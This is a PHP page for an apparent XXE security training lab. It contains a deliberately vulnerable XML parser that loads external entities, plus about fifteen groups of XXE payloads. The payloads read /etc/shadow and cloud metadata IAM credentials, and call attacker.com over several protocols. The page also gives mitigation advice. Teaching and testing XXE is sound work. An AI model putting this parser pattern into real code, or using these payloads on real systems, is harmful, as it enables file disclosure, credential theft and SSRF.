<?php
// Lab 1: Basic XML External Entity Injection
// Vulnerability: Basic XXE without proper validation

session_start();

$message = '';
$xml_output = '';
$parsed_data = [];

// Simulate XXE vulnerability
function process_xml_input($xml_input) {
    // Vulnerable: Direct XML processing without validation
    if (empty($xml_input)) {
        return "No XML input provided.";
    }
    
    // Vulnerable: Enable external entities (DEFAULT BEHAVIOR)
    libxml_disable_entity_loader(false);
    
    try {
        // Vulnerable: Direct XML parsing without validation
        $dom = new DOMDocument();
        $dom->loadXML($xml_input, LIBXML_NOENT | LIBXML_DTDLOAD);
        
        // Extract data from XML
        $data = [];
        $root = $dom->documentElement;
        
        foreach ($root->childNodes as $node) {
            if ($node->nodeType == XML_ELEMENT_NODE) {
                $data[$node->nodeName] = $node->textContent;
            }
        }
        
        return $data;
    } catch (Exception $e) {
        return "Error parsing XML: " . $e->getMessage();
    }
}

// Handle XXE
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['process_xml'])) {
    $xml_input = $_POST['xml_input'] ?? '';
    
    if ($xml_input) {
        $parsed_data = process_xml_input($xml_input);
        $message = '<div class="alert alert-success">XML processed successfully!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1: Basic XXE - XML External Entity Injection Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .xml-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .xxe-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to XXE Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 1: Basic XML External Entity Injection</h1>
            <p class="hero-subtitle">Basic XXE without proper validation</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates a basic XML External Entity (XXE) injection vulnerability where XML input is processed without proper validation. This allows attackers to inject malicious external entities that can lead to file disclosure and other security issues.</p>
            <p><strong>Objective:</strong> Inject malicious external entities to demonstrate XXE vulnerabilities.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct XML processing without validation
function process_xml_input($xml_input) {
    // Vulnerable: Enable external entities (DEFAULT BEHAVIOR)
    libxml_disable_entity_loader(false);
    
    try {
        // Vulnerable: Direct XML parsing without validation
        $dom = new DOMDocument();
        $dom->loadXML($xml_input, LIBXML_NOENT | LIBXML_DTDLOAD);
        
        // Process XML data...
        return $data;
    } catch (Exception $e) {
        return "Error parsing XML: " . $e->getMessage();
    }
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-slash me-2"></i>XXE Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="xxe-warning">
                            <h5>⚠️ XXE Warning</h5>
                            <p>This lab demonstrates XXE vulnerabilities. The following can be exploited:</p>
                            <ul>
                                <li><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code> - File disclosure</li>
                                <li><code>&lt;!ENTITY xxe SYSTEM "http://attacker.com"&gt;</code> - SSRF</li>
                                <li><code>&lt;!ENTITY xxe SYSTEM "data://text/plain;base64,SSBsb3ZlIFhYRSBhdHRhY2tz"&gt;</code> - Data URI</li>
                                <li><code>&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"&gt;</code> - PHP wrapper</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>XXE Examples</h5>
                            <p>Try these XXE payloads:</p>
                            <ul>
                                <li><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code> - File disclosure</li>
                                <li><code>&lt;!ENTITY xxe SYSTEM "http://attacker.com"&gt;</code> - SSRF</li>
                                <li><code>&lt;!ENTITY xxe SYSTEM "data://text/plain;base64,SSBsb3ZlIFhYRSBhdHRhY2tz"&gt;</code> - Data URI</li>
                                <li><code>&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"&gt;</code> - PHP wrapper</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="process_xml" value="1">
                            <div class="mb-3">
                                <label for="xml_input" class="form-label">XML Input</label>
                                <textarea class="form-control" id="xml_input" name="xml_input" 
                                          rows="8" placeholder="Enter XML with external entities..."><?php echo htmlspecialchars($_POST['xml_input'] ?? ''); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Process XML</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Parsed XML Data
                    </div>
                    <div class="card-body">
                        <div class="xml-display">
                            <h5>Parsed Data:</h5>
                            <?php if (is_array($parsed_data)): ?>
                                <pre><?php print_r($parsed_data); ?></pre>
                            <?php else: ?>
                                <p><?php echo htmlspecialchars($parsed_data); ?></p>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> XML External Entity Injection</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Direct XML processing without validation</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Test Payloads</h5>
                    <ul>
                        <li><code>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</code> - File disclosure</li>
                        <li><code>&lt;!ENTITY xxe SYSTEM "http://attacker.com"&gt;</code> - SSRF</li>
                        <li><code>&lt;!ENTITY xxe SYSTEM "data://text/plain;base64,SSBsb3ZlIFhYRSBhdHRhY2tz"&gt;</code> - Data URI</li>
                        <li><code>&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"&gt;</code> - PHP wrapper</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>XXE Payloads</h5>
            <p>Use these payloads to test XML External Entity Injection vulnerabilities:</p>
            
            <h6>1. Basic XXE Structure:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>2. File Disclosure Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///etc/hosts"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///etc/shadow"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>3. SSRF Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "http://attacker.com"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "http://localhost:8080/admin"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>4. Data URI Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "data://text/plain;base64,SSBsb3ZlIFhYRSBhdHRhY2tz"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "data://text/plain,Hello World"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>5. PHP Wrapper Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>6. Windows File Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>7. Linux File Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///etc/hosts"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///etc/shadow"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>8. Network Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "http://localhost:22"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "http://localhost:3306"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>9. Cloud Metadata Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>10. FTP Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "ftp://attacker.com/file.txt"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>11. Gopher Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "gopher://attacker.com:8080/1file.txt"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>12. LDAP Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "ldap://attacker.com:389/ou=users,dc=example,dc=com"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>13. SMB Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "smb://attacker.com/share/file.txt"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>14. Advanced File Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///proc/self/environ"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///proc/version"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>

            <h6>15. Configuration File Payloads:</h6>
            <div class="code-block">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///etc/apache2/apache2.conf"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;

&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Local file disclosure and sensitive data exposure</li>
                <li>Server-Side Request Forgery (SSRF) attacks</li>
                <li>Denial of Service (DoS) attacks</li>
                <li>Remote code execution in some cases</li>
                <li>Port scanning and internal network reconnaissance</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Disable external entity processing in XML parsers</li>
                    <li>Use whitelist-based validation for allowed XML schemas</li>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use secure XML parsing libraries</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual XML processing patterns</li>
                    <li>Implement Content Security Policy (CSP)</li>
                    <li>Use Web Application Firewall (WAF) to detect XXE attempts</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
